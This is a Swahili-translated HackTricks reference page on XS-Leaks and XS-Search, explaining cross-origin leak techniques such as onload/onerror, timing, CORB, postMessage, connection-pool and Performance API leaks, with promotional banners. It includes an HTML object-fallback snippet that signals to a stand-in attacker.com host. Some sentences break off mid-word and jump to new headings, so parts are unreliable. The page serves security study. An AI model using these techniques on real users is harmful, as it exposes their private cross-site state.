# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii ya **kisasa zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

XS-Search ni njia inayotumiwa kwa **kuchota habari za asili ya msalaba** kwa kutumia **mapungufu ya njia ya upande**.

Vipengele muhimu vinavyohusika katika shambulio hili ni:

* **Tovuti Hatarishi**: Tovuti ya lengo ambayo habari inalenga kuchotwa.
* **Tovuti ya Mshambuliaji**: Tovuti mbaya iliyoanzishwa na mshambuliaji, ambayo muathirika anatembelea, ikihifadhi shambulio.
* **Njia ya Kuingiza**: Mbinu inayotumiwa kuunganisha Tovuti Hatarishi kwenye Tovuti ya Mshambuliaji (k.m., window.open, iframe, fetch, lebo ya HTML na href, nk.).
* **Mbinu ya Kuvuja**: Mbinu zinazotumiwa kugundua tofauti katika hali ya Tovuti Hatarishi kulingana na habari iliyokusanywa kupitia njia ya kuingiza.
* **Hali**: Hali mbili za uwezekano wa Tovuti Hatarishi, ambazo mshambuliaji analenga kuzitofautisha.
* **Tofauti Zinazoweza Kugundulika**: Mabadiliko yanayoweza kuonekana ambayo mshambuliaji anategemea kufikiria hali ya Tovuti Hatarishi.

### Tofauti Zinazoweza Kugundulika

Vipengele kadhaa vinaweza kuchambuliwa ili kutofautisha hali za Tovuti Hatarishi:

* **Nambari ya Hali**: Kutofautisha kati ya **nambari za hali za majibu ya HTTP** za asili ya msalaba, kama makosa ya seva, makosa ya mteja, au makosa ya uwakiki.
* **Matumizi ya API**: Kutambua **matumizi ya API za Wavuti** kwenye kurasa, kufunua ikiwa ukurasa wa asili ya msalaba unatumia API maalum ya JavaScript ya Wavuti.
* **Uelekezaji**: Kugundua mabadiliko ya kurasa tofauti, sio tu uelekezaji wa HTTP lakini pia ule unaosababishwa na JavaScript au HTML.
* **Yaliyomo kwenye Ukurasa**: Kuchunguza **mabadiliko katika mwili wa majibu ya HTTP** au katika rasilimali ndogo za ukurasa, kama **idadi ya fremu zilizojumuishwa** au tofauti za ukubwa katika picha.
* **Kichwa cha HTTP**: Kuchunguza uwepo au labda thamani ya **kichwa maalum cha majibu ya HTTP**, ikiwa ni pamoja na vichwa kama X-Frame-Options, Content-Disposition, na Cross-Origin-Resource-Policy.
* **Wakati**: Kugundua tofauti za wakati thabiti kati ya hali mbili.

### Njia za Kuingiza

* **Vipengele vya HTML**: HTML inatoa vipengele mbalimbali kwa **kuhusisha rasilimali za asili ya msalaba**, kama mitindo, picha, au hati za JavaScript, kuilazimisha kivinjari kuomba rasilimali isiyokuwa ya HTML. Orodha ya vipengele vya HTML vinavyowezekana kwa kusudi hili inaweza kupatikana kwenye [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Fremu**: Vipengele kama **iframe**, **object**, na **embed** vinaweza kuingiza rasilimali za HTML moja kwa moja kwenye ukurasa wa mshambuliaji. Ikiwa ukurasa **hauna ulinzi wa fremu**, JavaScript inaweza kupata kivinjari cha rasilimali iliyoframewa kupitia mali ya contentWindow.
* **Pop-ups**: Mbinu ya **`window.open`** inafungua rasilimali kwenye kichupo au dirisha kipya, ikitoa **kushughulikia dirisha** ambalo JavaScript inaweza kuingiliana na njia na mali zinazofuata SOP. Pop-ups, mara nyingi hutumiwa katika kuingia kwa moja kwa moja, zinapuuza vizuizi vya fremu na kuki za rasilimali ya lengo. Walakini, vivinjari vya kisasa vinazuia uundaji wa pop-up kwa hatua fulani za mtumiaji.
* **Ombi za JavaScript**: JavaScript inaruhusu ombi moja kwa moja kwa rasilimali za lengo kwa kutumia **XMLHttpRequests** au **Fetch API**. Njia hizi zinatoa udhibiti sahihi juu ya ombi, kama kuchagua kufuata uelekezaji wa HTTP.

### Mbinu za Kuvuja

* **Msimamizi wa Tukio**: Mbinu ya kuvuja ya kawaida katika XS-Leaks, ambapo wasimamizi wa tukio kama **onload** na **onerror** hutoa ufahamu juu ya mafanikio au kushindwa kwa kupakia rasilimali.
* **Ujumbe wa Makosa**: Mifano ya JavaScript au kurasa maalum za makosa zinaweza kutoa habari ya kuvuja moja kwa moja kutoka kwa ujumbe wa makosa au kwa kutofautisha kati ya uwepo na kutokuwepo kwake.
* **Vikomo Vya Kijumla**: Vikomo vya kimwili vya kivinjari, kama uwezo wa kumbukumbu au vikomo vingine vilivyowekwa na kivinjari, vinaweza kuashiria wakati kizingiti kinapofikiwa, kama mbinu ya kuvuja.
* **Hali ya Kijumla**: Mwingiliano unaoweza kugundulika na **hali za kijumla** za vivinjari (k.m., kiolesura cha Historia) unaweza kutumiwa vibaya. Kwa mfano, **idadi ya vipengele** katika historia ya kivinjari inaweza kutoa vidokezo juu ya kurasa za asili ya msalaba.
* **API ya Utendaji**: API hii hutoa **maelezo ya utendaji wa ukurasa wa sasa**, ikiwa ni pamoja na wakati wa mtandao kwa hati na rasilimali zilizopakia, kuruhusu kufikiria juu ya rasilimali zilizoombwa.
* **Sifa Zinazoweza Kusomwa**: Baadhi ya sifa za HTML ni **zinazoweza kusomwa kwa asili ya msalaba** na
## **Mbinu za kutegemea Wakati**

Baadhi ya mbinu zifuatazo zitatumia wakati kama sehemu ya mchakato wa kugundua tofauti katika hali zinazowezekana za kurasa za wavuti. Kuna njia tofauti za kupima wakati katika kivinjari cha wavuti.

**Makadirio**: API ya [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) inaruhusu watengenezaji kupata vipimo vya wakati vilivyo na azimio kubwa.\
Kuna idadi kubwa ya API ambazo wadukuzi wanaweza kutumia vibaya kuunda saa za kutoeleweka: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, na zingine.\
Kwa habari zaidi: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Mbinu za Msimamizi wa Tukio

### Onload/Onerror

* **Njia za Uingizaji**: Fremu, Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali
* **Maelezo zaidi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Muhtasari**: Ikiwa jaribio la kupakia rasilimali linasababisha matukio ya onerror/onload wakati rasilimali inapakia kwa mafanikio/kiushindwa, inawezekana kugundua nambari ya hali.
* **Mfano wa nambari**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Mfano wa nambari unajaribu **kupakia vitu vya skrini kutoka JS**, lakini **vitambulisho vingine** kama vitu, vitambulisho vya HTML, picha, sauti pia vinaweza kutumika. Zaidi ya hayo, pia inawezekana kuingiza **kitambulisho moja kwa moja** na kutangaza matukio ya `onload` na `onerror` ndani ya kitambulisho (badala ya kuingiza kutoka JS).

Pia kuna toleo lisilo na skripti la shambulio hili:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Katika kesi hii, ikiwa `example.com/404` haipatikani, `attacker.com/?error` itapakia.

### Onload Timing

* **Njia za Uingizaji**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Muhtasari:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** inaweza kutumika kupima muda unaohitajika kufanya ombi. Walakini, saa zingine zingine zinaweza kutumika, kama vile [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) ambayo inaweza kutambua kazi zinazoendelea kwa zaidi ya 50ms.
* **Mfano wa Nambari**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) mfano mwingine katika:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Kazi Kubwa Iliyolazimishwa

Tekniki hii ni kama ile iliyotangulia, lakini **mshambuliaji** pia atalazimisha hatua fulani kuchukua **muda muhimu** wakati **jibu ni chanya au hasi** na kupima wakati huo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Njia za Uingizaji**: Fremu
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Muhtasari:** [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) inaweza kutumika kupima muda unaohitajika kufanya ombi. Saa zingine zingine zinaweza kutumika.
* **Mfano wa Nambari**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Muda unaotumika kupakua rasilimali unaweza kupimwa kwa kutumia matukio ya [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) na [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Tukio la **`beforeunload`** linatokea wakati kivinjari kinapojiandaa kuhamia kwenye ukurasa mpya, wakati tukio la **`unload`** linatokea wakati uhamisho unafanyika kwa kweli. Tofauti ya wakati kati ya matukio haya mawili inaweza kuhesabiwa ili kujua **muda ambao kivinjari kilichukua kupakua rasilimali**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Njia za Uingizaji**: Fremu
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Muhtasari:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API inaweza kutumika kupima muda unaohitajika kufanya ombi. Saa zingine zingine zinaweza kutumika.
* **Mfano wa Nambari**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Imeonekana kuwa katika kutokuwepo kwa [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), muda unaohitajika kwa ukurasa na rasilimali zake za ndani kupakia kupitia mtandao unaweza kupimwa na mshambuliaji. Kipimo hiki kawaida kinawezekana kwa sababu kifaa cha `onload` cha fremu kinachomsha tu baada ya kukamilika kwa upakiaji wa rasilimali na utekelezaji wa JavaScript. Ili kuepuka tofauti iliyosababishwa na utekelezaji wa script, mshambuliaji anaweza kutumia sifa ya [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) ndani ya `<iframe>`. Kuongezwa kwa sifa hii kunazuia utendaji mbalimbali, haswa utekelezaji wa JavaScript, hivyo kurahisisha kipimo kinachotawaliwa zaidi na utendaji wa mtandao.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + kosa + onload

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**:
* **Muhtasari**: Ikiwa unaweza kufanya ukurasa uwe na kosa wakati yaliyomo sahihi inafikiwa na kuiruhusu ipakie kwa usahihi wakati yaliyomo yoyote inafikiwa, basi unaweza kuunda mzunguko wa kutoa habari yote bila kupima wakati.
* **Mfano wa Kanuni**:

Fikiria unaweza **kuweka** **ukurasa** ambao una **yaliyomo ya siri ndani ya Iframe**.

Unaweza **kufanya mwathiriwa kutafuta** faili ambayo ina "_**flag**_" kwa kutumia **Iframe** (kwa mfano, kwa kuchexploit CSRF). Ndani ya Iframe unajua kuwa tukio la _**onload**_ litatekelezwa angalau mara moja. Kisha, unaweza **kubadilisha** **URL** ya **iframe** lakini kubadilisha tu **yaliyomo** ya **hash** ndani ya URL.

Kwa mfano:

1. **URL1**: www.attacker.com/xssearch#jaribu1
2. **URL2**: www.attacker.com/xssearch#jaribu2

Ikiwa URL ya kwanza ilipakia **kwa mafanikio**, basi, wakati **kubadilisha** sehemu ya **hash** ya URL, tukio la **onload** **halitazinduliwa** tena. Lakini **ikiwa** ukurasa ulikuwa na aina fulani ya **kosa** wakati wa kupakia, basi, tukio la **onload** litazinduliwa tena.

Kwa hivyo, unaweza **kutofautisha kati ya** ukurasa uliopakiwa **kwa usahihi** au ukurasa ambao una **kosa** wakati unafikiwa.

### Utekelezaji wa Javascript

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**:
* **Muhtasari**: Ikiwa **ukurasa** unarudisha **yaliyomo nyeti**, **au** yaliyomo ambayo inaweza **kudhibitiwa** na mtumiaji. Mtumiaji anaweza kuweka **msimbo wa JS sahihi katika kesi hasi**, na **kuupakia** kila jaribio ndani ya vitambulisho vya **`<script>`**, kwa hivyo katika kesi **hasi** msimbo wa wadukuzi unatekelezwa, na katika kesi **thabiti** hakuna kitu kitatekelezwa.
* **Mfano wa Kanuni**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali & Vichwa vya Habari
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Muhtasari**: **Cross-Origin Read Blocking (CORB)** ni hatua ya usalama inayozuia kurasa za wavuti kupakia rasilimali nyeti za asili tofauti ili kulinda dhidi ya mashambulizi kama **Spectre**. Walakini, wadukuzi wanaweza kuchexploit tabia yake ya kinga. Wakati majibu yanayotii **CORB** yanarudisha `Content-Type` iliyolindwa na **CORB** na `nosniff` na nambari ya hali ya `2xx`, **CORB** inaondoa mwili na vichwa vya habari vya majibu. Wadukuzi wanaoangalia hii wanaweza kuhitimisha mchanganyiko wa **nambari ya hali** (inayoonyesha mafanikio au kosa) na `Content-Type` (inayoelezea ikiwa inalindwa na **CORB**), ikiongoza kuvuja kwa habari inayowezekana.
* **Mfano wa Kanuni**:

Angalia kiungo cha maelezo zaidi kwa habari zaidi kuhusu shambulio hili.

### onblur

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Muhtasari**: Fichua data nyeti kutoka kwa kitambulisho au sifa ya jina.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Inawezekana **kupakia ukurasa** ndani ya **iframe** na kutumia **`#id_value`** ili kufanya ukurasa ufikie kwenye kipengele cha iframe kilichotajwa, kisha ikiwa ishara ya **`onblur`** inazinduliwa, kipengele cha ID kipo.\
Unaweza kufanya shambulio sawa na vitambulisho vya **`portal`**.

### Matangazo ya postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Njia za Kuingiza**: Fremu, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Matumizi ya API
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Muhtasari**: Kusanya habari nyeti kutoka kwa postMessage au tumia uwepo wa postMessages kama oracle kujua hali ya mtumiaji kwenye ukurasa
* **Mfano wa Kanuni**: `Msimbo wowote unaoisikiliza postMessages zote.`

Programu mara nyingi hutumia [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kuwasiliana kati ya asili tofauti. Walakini, njia hii inaweza kusababisha kufichua **habari nyeti** ikiwa parameter ya `targetOrigin` haijaspecifywa kwa usahihi, kuruhusu dirisha lolote kupokea ujumbe. Zaidi ya hayo, tendo la kupokea ujumbe linaweza kutumika kama **oracle**; kwa mfano, ujumbe fulani unaweza kutumwa tu kwa watumiaji walioingia. Kwa hivyo, uwepo au kutokuwepo kwa ujumbe huu unaweza kufichua habari kuhusu hali au kitambulisho cha mtumiaji, kama vile ikiwa wamehakikiwa au la.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mchakato ulioendeshwa na zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Teknolojia za Kikomo za Kimataifa

### API ya WebSocket

* **Njia za Kuingiza**: Fremu, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Matumizi ya API
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Muhtasari**: Kuchosha kikomo cha uhusiano wa WebSocket kunaleta kuvuja kwa idadi ya uhusiano wa WebSocket wa ukurasa wa asili tofauti.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Inawezekana kutambua ikiwa, na ni ngapi, **uhusiano wa WebSocket ukurasa wa lengo unatumia**.
### API ya Malipo

* **Njia za Kuingiza**: Frames, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Matumizi ya API
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Muhtasari**: Gundi Ombi la Malipo kwa sababu inaweza kuwa moja tu wakati mmoja.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

XS-Leak hii inawezesha mshambuliaji kugundua wakati ukurasa wa asili unaanzisha ombi la malipo.

Kwa sababu inaweza kuwa ombi moja tu la malipo linaloendelea wakati mmoja, ikiwa tovuti ya lengo inatumia API ya Ombi la Malipo, jaribio lolote la kuonyesha API hii tena litashindwa na kusababisha kosa la JavaScript. Mshambuliaji anaweza kutumia hii kwa kujaribu mara kwa mara kuonyesha UI ya API ya Malipo. Ikiwa jaribio moja linasababisha kosa, tovuti ya lengo inaitumia kwa sasa. Mshambuliaji anaweza kuficha majaribio haya ya mara kwa mara kwa kufunga UI mara moja baada ya kuibuni.

### Kupima Mzunguko wa Tukio <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Njia za Kuingiza**:
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Muhtasari**: Pima muda wa utekelezaji wa wavuti kwa kuchanganya mzunguko wa tukio la JS lenye wigo mmoja.
* **Mfano wa Kanuni**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript inafanya kazi kwenye mfano wa mzunguko wa tukio lenye wigo mmoja, ikimaanisha kwamba inaweza kutekeleza kazi moja tu kwa wakati mmoja. Tabia hii inaweza kutumiwa kwa kipimo cha muda gani nambari kutoka asili tofauti inachukua kutekelezwa. Mshambuliaji anaweza kupima muda wa utekelezaji wa nambari yao wenyewe kwenye mzunguko wa tukio kwa kuendelea kutuma matukio na mali zilizowekwa. Matukio haya yatachakatwa wakati dimbwi la matukio linapokuwa tupu. Ikiwa asili nyingine pia inatuma matukio kwenye dimbwi sawa, mshambuliaji anaweza kuhitimisha muda inachukua matukio haya ya nje kutekelezwa kwa kuchunguza kuchelewa kwa utekelezaji wa kazi zao wenyewe. Njia hii ya kufuatilia mzunguko wa tukio kwa kuchelewa kunaweza kufunua muda wa utekelezaji wa nambari kutoka asili tofauti, na hivyo kufichua habari nyeti.

{% hint style="warning" %}
Katika kipimo cha muda wa utekelezaji, ni **wazi** **faktor za mtandao** ili kupata **vipimo sahihi zaidi**. Kwa mfano, kwa kupakia rasilimali zinazotumiwa na ukurasa kabla ya kupakia ukurasa huo.
{% endhint %}

### Mzunguko wa Tukio Uliojaa <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Njia za Kuingiza**:
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Muhtasari**: Njia moja ya kupima muda wa utekelezaji wa shughuli ya wavuti ni kwa kusudi kuzuia mzunguko wa tukio la wimbi na kisha kupima muda gani inachukua kwa mzunguko wa tukio kuwa tena inapatikana. Kwa kuingiza shughuli ya kuzuia (kama hesabu ndefu au wito wa API ya kusawazisha) kwenye mzunguko wa tukio, na kufuatilia muda inachukua kwa nambari inayofuata kuanza utekelezaji, mtu anaweza kuhitimisha muda wa kazi zilizokuwa zikitekelezwa kwenye mzunguko wa tukio wakati wa kipindi cha kuzuia. Njia hii inatumia asili moja ya wimbi la tukio la JavaScript, ambapo kazi zinatekelezwa kwa mfululizo, na inaweza kutoa ufahamu juu ya utendaji au tabia ya shughuli zingine zinazoshiriki wimbi sawa.
* **Mfano wa Kanuni**:

Faida kubwa ya njia ya kupima muda wa utekelezaji kwa kufunga mzunguko wa tukio ni uwezo wake wa kuepuka **Kuweka Tovuti**. **Kuweka Tovuti** ni kipengele cha usalama kinachotenganisha tovuti tofauti katika michakato tofauti, kwa lengo la kuzuia tovuti mbaya kupata moja kwa moja data nyeti kutoka kwenye tovuti nyingine. Walakini, kwa kubadilisha muda wa utekelezaji wa asili nyingine kupitia mzunguko wa tukio ulioshiriki, mshambuliaji anaweza kwa njia isiyo ya moja kwa moja kutoa habari kuhusu shughuli za asili hiyo. Njia hii haijategemea upatikanaji wa moja kwa moja wa data ya asili nyingine, bali inachunguza athari ya shughuli za asili hiyo kwenye mzunguko wa tukio ulioshiriki, hivyo kuepuka vizuizi vya kinga vilivyowekwa na **Kuweka Tovuti**.

{% hint style="warning" %}
Katika kipimo cha muda wa utekelezaji, ni **wazi** **faktor za mtandao** ili kupata **vipimo sahihi zaidi**. Kwa mfano, kwa kupakia rasilimali zinazotumiwa na ukurasa kabla ya kupakia ukurasa huo.
{% endhint %}

### Dimbwi la Uunganisho

* **Njia za Kuingiza**: Ombi za JavaScript
* **Tofauti Inayoweza Kugundulika**: Muda (kwa ujumla kutokana na Yaliyomo kwenye Ukurasa, Nambari ya Hali)
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Muhtasari**: Mshambuliaji anaweza kufunga soketi zote isipokuwa 1, kupakia wavuti ya lengo na wakati huo huo kupakia ukurasa mwingine, muda mpaka ukurasa wa mwisho uanze kupakia ni muda ambao ukurasa wa lengo ulichukua kupakia.
* **Mfano wa Kanuni**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Vivinjari hutumia soketi kwa mawasiliano na seva, lakini kutokana na rasilimali ndogo za mfumo wa uendeshaji na vifaa, vivinjari wanalazimika kuweka kikomo kwa idadi ya soketi zinazoruhusiwa wakati mmoja. Wadukuzi wanaweza kutumia kikomo hiki kupitia hatua zifuatazo:

1. Kuhakikisha kikomo cha soketi cha kivinjari, kwa mfano, soketi 256 za ulimwengu.
2. Kuchukua soketi 255 kwa muda mrefu kwa kuanzisha maombi 255 kwa wenyewe, yaliyoundwa kuweka uhusiano wazi bila kuk
## Mbinu za API ya Utendaji

[`API ya Utendaji`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) inatoa ufahamu juu ya vipimo vya utendaji wa programu za wavuti, ikiongezwa zaidi na [`API ya Ufuatiliaji wa Rasilmali`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). API ya Ufuatiliaji wa Rasilmali inawezesha ufuatiliaji wa muda wa ombi za mtandao kwa undani, kama vile muda wa ombi. Hasa, wakati seva zinaongeza kichwa cha `Timing-Allow-Origin: *` katika majibu yao, data ya ziada kama ukubwa wa uhamisho na muda wa utafutaji wa kikoa inapatikana.

Ugavi huu wa data unaweza kupatikana kupitia njia kama [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) au [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), ikitoa mtazamo kamili wa habari zinazohusiana na utendaji. Zaidi ya hayo, API inawezesha kupima nyakati za utekelezaji kwa kuhesabu tofauti kati ya alama za wakati zilizopatikana kutoka [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Hata hivyo, ni muhimu kuzingatia kuwa kwa baadhi ya shughuli katika vivinjari kama Chrome, usahihi wa `performance.now()` unaweza kuwa mdogo hadi milisekunde, ambayo inaweza kuathiri ufanisi wa vipimo vya wakati.

Zaidi ya vipimo vya wakati, API ya Utendaji inaweza kutumika kwa ufahamu unaohusiana na usalama. Kwa mfano, uwepo au kutokuwepo kwa kurasa katika kitu cha `utendaji` katika Chrome kunaweza kuashiria matumizi ya `X-Frame-Options`. Hasa, ikiwa ukurasa umefungwa kutoka kuonyesha katika fremu kutokana na `X-Frame-Options`, hautarekodiwa katika kitu cha `utendaji`, kutoa dalili ndogo kuhusu sera za kuweka fremu za ukurasa.

### Kuvuja kwa Hitilafu

* **Njia za Kuingiza**: Fremu, Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Ombi linalosababisha hitilafu halitaunda kuingia kwa wakati wa rasilmali.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Inawezekana **kutofautisha kati ya nambari za hali za majibu ya HTTP** kwa sababu ombi ambalo linaleta **hitilafu** haliumbi kuingia cha utendaji.

### Hitilafu ya Upya wa Mtindo

* **Njia za Kuingiza**: Vipengele vya HTML
